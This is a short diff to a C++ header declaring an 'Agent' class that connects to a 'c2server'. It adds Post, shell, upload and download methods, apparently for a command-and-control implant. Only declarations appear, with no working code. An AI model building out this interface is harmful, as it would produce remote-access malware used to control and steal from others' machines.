@@ -23,6 +23,10 @@ public:
 	// ip/port for c2server
 	Agent(std::string ip, unsigned int port);
 	std::string Get(std::string path);
-	std::string Get(std::string path);
+	std::string Post(std::string path, std::string data);
+
+	void shell();
+	void upload();
+	void download();
 
 };
